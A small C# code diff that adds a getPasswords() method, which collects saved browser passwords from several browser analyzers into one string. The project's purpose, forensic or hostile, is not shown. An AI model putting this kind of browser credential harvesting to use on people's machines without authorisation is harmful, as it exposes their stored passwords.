@@ -21,5 +21,12 @@ namespace Controller {
                 res += ba.getDownloads();
             return res;
         }
+
+        public string getPasswords() {
+            string res = "";
+            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
+                res += ba.getPasswords();
+            return res;
+        }
     }
 }
